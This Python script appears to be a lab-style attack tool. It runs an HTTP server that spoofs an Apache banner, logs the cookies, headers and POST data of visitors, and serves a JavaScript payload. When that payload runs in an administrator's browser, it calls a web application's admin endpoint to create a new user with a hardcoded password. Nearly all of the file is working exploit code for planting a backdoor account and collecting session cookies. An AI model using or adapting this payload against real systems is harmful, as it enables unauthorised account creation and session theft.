#!/usr/bin/python3
import os
import sys
from http.server import BaseHTTPRequestHandler, HTTPServer
from http.cookies import SimpleCookie

# Global variables
timeout = 3
server_token = "Apache"
host = "192.168.119.142"
port = 6969

# Handle CTRL-C
def keyboard_interrupt():
    """Handles keyboardinterrupt exceptions"""
    print("\n\n[*] User requested an interrupt, exiting...")
    exit(0)

def printCookie(cookie):
    for key,morsel in cookie.items():
        print("Cookie: " + morsel.key + "=" + morsel.value)

def js_code(host,port):
    js = '''var username = "CREATEDUSER";
	var password = "hurdur";

	function read_body(xhr) {
	    var data;
	    if (!xhr.responseType || xhr.responseType === "text") {
		data = xhr.responseText;
	    } else if (xhr.responseType === "document") {
		data = xhr.responseXML;
	    } else if (xhr.responseType === "json") {
		data = xhr.responseJSON;
	    } else {
		data = xhr.response;
	    }
	    return data;
	}

	var xhr = new XMLHttpRequest();
	var uri = "/index.php/admin/users/create/";
	var query_string = "?NewContact=1&username=" + username + "&domain=mydomain.com&Password=" + password + "&UserQuota=1024&numberFieldName=%5b%5d=UserHomePhone";

	xhr.onreadystatechange = function() {
	    if (xhr.readyState == XMLHttpRequest.DONE) {
		console.log(read_body(xhr));
	    }
	}

	xhr.open("GET", uri + query_string, true);
	xhr.send(null);
	'''
    return js

class serveHTTP(BaseHTTPRequestHandler):
    def do_GET(s):
        all_cookies = SimpleCookie(s.headers.get('Cookie'))
        s.server_version = server_token
        s.sys_version = ''
        s.send_response(200)
        s.send_header("Content-type", "text/html")
        s.end_headers()
        cookies = {}
        print("\n[*] GET:\nPath: " + str(s.path) + "\nHeaders:\n" + str(s.headers))
        printCookie(all_cookies)
        print("\n")
        payload = js_code(host,port)
        s.wfile.write(payload.encode())

    def do_POST(s):
        cookies = SimpleCookie(s.headers.get('Cookie'))
        s.server_version = server_token
        s.sys_version = ''
        s.send_response(200)
        s.end_headers()
        length = int(s.headers['Content-Length'])
        postVar = s.rfile.read(length)
        print("\n[*] POST:\nPath: " + str(s.path) + "\nHeaders:\n" + str(s.headers) + "Params:\n" +  postVar.decode() + "\n")

# Main
def main(argv):
    #if len(sys.argv) == 2:
    #    host = sys.argv[1]
    #    port = int(sys.argv[2])
    #else:
    #    print("[*] Usage: " + sys.argv[0] + "\n")
    #    exit(0)

    server_class = HTTPServer
    httpd = server_class(('', port), serveHTTP)

    # Do stuff
    try:
        print("[*] Accepting HTTP connections on host " + host + " port " + str(port) + "...")
        httpd.serve_forever()
    except KeyboardInterrupt:
        keyboard_interrupt()

# If we were called as a program, go execute the main function.
if __name__ == "__main__":
    main(sys.argv[1:])
